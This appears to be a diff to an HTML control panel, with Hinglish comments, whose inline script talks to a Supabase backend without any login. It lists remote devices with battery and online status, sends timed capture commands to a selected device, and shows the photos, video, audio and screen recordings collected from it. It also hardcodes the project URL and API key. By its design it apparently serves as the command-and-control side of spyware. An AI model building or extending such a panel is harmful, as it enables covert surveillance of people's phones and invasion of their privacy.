@@ -8,12 +8,9 @@
 </head>
 <body>
 
-<!-- DASHBOARD — Direct open, no login -->
 <div id="dashboard" class="screen">
-
-    <!-- ⭐ DIAGNOSTIC BANNER -->
     <div id="debugInfo" style="background:#F59E0B;color:#FFF;padding:10px;font-size:12px;font-weight:bold;text-align:center;">
-        JS Check: Loading...
+        Starting...
     </div>
 
     <header class="app-header">
@@ -81,8 +78,292 @@
 
 <div id="toast" class="toast hidden"></div>
 
-<!-- ⭐ App Logic (direct fetch, no SDK needed) -->
-<script src="app.js?v=5"></script>
+<!-- ⭐ SAB KUCH INLINE -->
+<script>
+(function() {
+    'use strict';
+    
+    var SUPABASE_URL = "https://weyfoshcpyqjbcmpxrqq.supabase.co";
+    var SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndleWZvc2hjcHlxamJjbXB4cnFxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3OTEyODIzNDEsImV4cCI6MjEwNjg1ODM0MX0.0ur5-MQdbtbZdG9Q7CzHAhzMv5Z7unXGti3fuz6vk0U";
+    
+    var currentDeviceKey = null;
+    
+    function setBanner(text, color) {
+        var b = document.getElementById('debugInfo');
+        if (b) {
+            b.style.background = color;
+            b.textContent = text;
+        }
+    }
+    
+    function getHeaders() {
+        return {
+            'apikey': SUPABASE_ANON_KEY,
+            'Authorization': 'Bearer ' + SUPABASE_ANON_KEY
+        };
+    }
+    
+    function postHeaders() {
+        return {
+            'apikey': SUPABASE_ANON_KEY,
+            'Authorization': 'Bearer ' + SUPABASE_ANON_KEY,
+            'Content-Type': 'application/json',
+            'Prefer': 'return=minimal'
+        };
+    }
+    
+    function timeAgo(ts) {
+        if (!ts) return '—';
+        var diff = Date.now() - new Date(ts).getTime();
+        if (diff < 60000) return 'Just now';
+        if (diff < 3600000) return Math.floor(diff / 60000) + 'm ago';
+        if (diff < 86400000) return Math.floor(diff / 3600000) + 'h ago';
+        return Math.floor(diff / 86400000) + 'd ago';
+    }
+    
+    function escapeHtml(str) {
+        if (!str) return '';
+        return String(str).replace(/[&<>"']/g, function(c) {
+            return {'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c];
+        });
+    }
+    
+    function toast(msg, type) {
+        var el = document.getElementById('toast');
+        if (!el) return;
+        el.textContent = msg;
+        el.className = 'toast ' + (type || 'info');
+        el.classList.remove('hidden');
+        clearTimeout(window._toastTimer);
+        window._toastTimer = setTimeout(function() {
+            el.classList.add('hidden');
+        }, 3000);
+    }
+    
+    async function loadDevices() {
+        var list = document.getElementById('devicesList');
+        if (!list) return;
+        
+        list.innerHTML = '<div class="loading">Loading devices...</div>';
+        setBanner('Fetching devices...', '#F59E0B');
+        
+        try {
+            var url = SUPABASE_URL + '/rest/v1/devices?select=*&order=last_seen.desc';
+            console.log('[Devices] URL:', url);
+            
+            var res = await fetch(url, { headers: getHeaders() });
+            console.log('[Devices] Status:', res.status);
+            
+            if (!res.ok) {
+                var t = await res.text();
+                setBanner('❌ HTTP ' + res.status, '#EF4444');
+                list.innerHTML = '<div class="empty">❌ HTTP ' + res.status + '<br><small>' + escapeHtml(t.substring(0, 200)) + '</small></div>';
+                return;
+            }
+            
+            var data = await res.json();
+            console.log('[Devices] Data:', data);
+            
+            setBanner('✓ ' + data.length + ' device(s) loaded', '#10B981');
+            
+            if (!data || data.length === 0) {
+                list.innerHTML = '<div class="empty">📭 Koi device nahi</div>';
+                return;
+            }
+            
+            list.innerHTML = data.map(function(d) {
+                var isOnline = d.last_seen && (Date.now() - new Date(d.last_seen).getTime() < 5 * 60 * 1000);
+                var name = ((d.brand || '') + ' ' + (d.model || '')).trim() || (d.device_key || '').substring(0, 8);
+                var battery = d.battery_level >= 0 ? d.battery_level + '%' : '—';
+                
+                return '<div class="device-card" data-key="' + escapeHtml(d.device_key) + '">' +
+                    '<div class="device-name">' +
+                    '<span class="status-dot ' + (isOnline ? 'online' : 'offline') + '"></span>' +
+                    escapeHtml(name) +
+                    '</div>' +
+                    '<div class="device-meta">' +
+                    '<span>🔋 ' + battery + '</span>' +
+                    '<span>' + timeAgo(d.last_seen) + '</span>' +
+                    '</div>' +
+                    '</div>';
+            }).join('');
+            
+            list.querySelectorAll('.device-card').forEach(function(card) {
+                card.addEventListener('click', function() {
+                    selectDevice(card.dataset.key, data);
+                });
+            });
+            
+            if (data.length === 1 && !currentDeviceKey) {
+                selectDevice(data[0].device_key, data);
+            }
+        } catch (e) {
+            console.error('[Devices]', e);
+            setBanner('❌ ' + e.message, '#EF4444');
+            list.innerHTML = '<div class="empty">❌ ' + escapeHtml(e.message) + '</div>';
+        }
+    }
+    
+    function selectDevice(key, devices) {
+        currentDeviceKey = key;
+        document.querySelectorAll('.device-card').forEach(function(c) {
+            c.classList.toggle('active', c.dataset.key === key);
+        });
+        
+        var device = null;
+        for (var i = 0; i < devices.length; i++) {
+            if (devices[i].device_key === key) {
+                device = devices[i];
+                break;
+            }
+        }
+        if (!device) return;
+        
+        var actionsSection = document.getElementById('actionsSection');
+        if (actionsSection) actionsSection.classList.remove('hidden');
+        
+        var name = ((device.brand || '') + ' ' + (device.model || '')).trim() || key.substring(0, 8);
+        var nameEl = document.getElementById('selectedName');
+        if (nameEl) nameEl.textContent = name;
+        
+        var isOnline = device.last_seen && (Date.now() - new Date(device.last_seen).getTime() < 5 * 60 * 1000);
+        var statusEl = document.getElementById('selectedStatus');
+        if (statusEl) {
+            statusEl.textContent = isOnline ? '🟢 Online' : '🔴 Offline';
+            statusEl.className = 'status-badge ' + (isOnline ? 'online' : 'offline');
+        }
+        
+        var batteryEl = document.getElementById('batteryText');
+        if (batteryEl) batteryEl.textContent = device.battery_level >= 0 ? device.battery_level + '%' : '—';
+        
+        var lastSeenEl = document.getElementById('lastSeenText');
+        if (lastSeenEl) lastSeenEl.textContent = timeAgo(device.last_seen);
+        
+        loadMedia();
+    }
+    
+    async function sendCommand(btn, cmd) {
+        if (!currentDeviceKey) {
+            toast('Pehle device select karo', 'error');
+            return;
+        }
+        
+        if (btn) {
+            btn.disabled = true;
+            setTimeout(function() { btn.disabled = false; }, 1500);
+        }
+        
+        try {
+            var url = SUPABASE_URL + '/rest/v1/commands';
+            var res = await fetch(url, {
+                method: 'POST',
+                headers: postHeaders(),
+                body: JSON.stringify({
+                    device_key: currentDeviceKey,
+                    cmd: cmd,
+                    status: 'pending'
+                })
+            });
+            
+            if (!res.ok) {
+                var t = await res.text();
+                throw new Error('HTTP ' + res.status + ': ' + t.substring(0, 100));
+            }
+            
+            toast('✓ ' + cmd + ' bheja', 'success');
+            console.log('[Command] Sent:', cmd);
+        } catch (e) {
+            console.error('[Command]', e);
+            toast('Fail: ' + e.message, 'error');
+        }
+    }
+    
+    function sendCustom(type) {
+        var el = document.getElementById('customDuration');
+        var d = parseInt(el ? el.value : 30) || 30;
+        sendCommand(null, type + ':' + d);
+    }
+    
+    async function loadMedia() {
+        var list = document.getElementById('mediaList');
+        if (!list || !currentDeviceKey) return;
+        
+        list.innerHTML = '<div class="loading">Loading media...</div>';
+        
+        try {
+            var url = SUPABASE_URL + '/rest/v1/media?device_key=eq.' + encodeURIComponent(currentDeviceKey) + '&select=*&order=created_at.desc&limit=20';
+            var res = await fetch(url, { headers: getHeaders() });
+            
+            if (!res.ok) {
+                list.innerHTML = '<div class="empty">❌ HTTP ' + res.status + '</div>';
+                return;
+            }
+            
+            var data = await res.json();
+            
+            if (!data || data.length === 0) {
+                list.innerHTML = '<div class="empty">Koi media nahi</div>';
+                return;
+            }
+            
+            list.innerHTML = data.map(function(m) {
+                var mediaUrl = m.public_url || '';
+                var type = m.media_type || 'photo';
+                var icon = '📄';
+                if (type === 'photo') icon = '📸';
+                else if (type === 'video') icon = '🎥';
+                else if (type === 'audio') icon = '🎤';
+                else if (type === 'screen') icon = '📹';
+                
+                return '<div class="media-item" data-url="' + escapeHtml(mediaUrl) + '">' +
+                    '<div class="media-icon">' + icon + '</div>' +
+                    '<img src="' + escapeHtml(mediaUrl) + '" loading="lazy" onerror="this.style.display=\'none\'">' +
+                    '<div class="media-item-label">' +
+                    '<span>' + type + '</span>' +
+                    '<span>' + timeAgo(m.created_at) + '</span>' +
+                    '</div>' +
+                    '</div>';
+            }).join('');
+            
+            list.querySelectorAll('.media-item').forEach(function(item) {
+                item.addEventListener('click', function() {
+                    window.open(item.dataset.url, '_blank');
+                });
+            });
+        } catch (e) {
+            console.error('[Media]', e);
+            list.innerHTML = '<div class="empty">❌ ' + escapeHtml(e.message) + '</div>';
+        }
+    }
+    
+    // Expose globally
+    window.sendCustom = sendCustom;
+    
+    // INIT
+    document.addEventListener('DOMContentLoaded', function() {
+        console.log('[Panel] DOM loaded');
+        
+        var refreshBtn = document.getElementById('refreshBtn');
+        if (refreshBtn) refreshBtn.addEventListener('click', function() { location.reload(); });
+        
+        var logoutBtn = document.getElementById('logoutBtn');
+        if (logoutBtn) logoutBtn.addEventListener('click', function() { location.reload(); });
+        
+        var rm = document.getElementById('refreshMediaBtn');
+        if (rm) rm.addEventListener('click', loadMedia);
+        
+        document.querySelectorAll('.action-btn[data-cmd]').forEach(function(btn) {
+            btn.addEventListener('click', function() {
+                sendCommand(btn, btn.dataset.cmd);
+            });
+        });
+        
+        // Load devices
+        loadDevices();
+    });
+    
+})();
+</script>
 
 </body>
 </html>
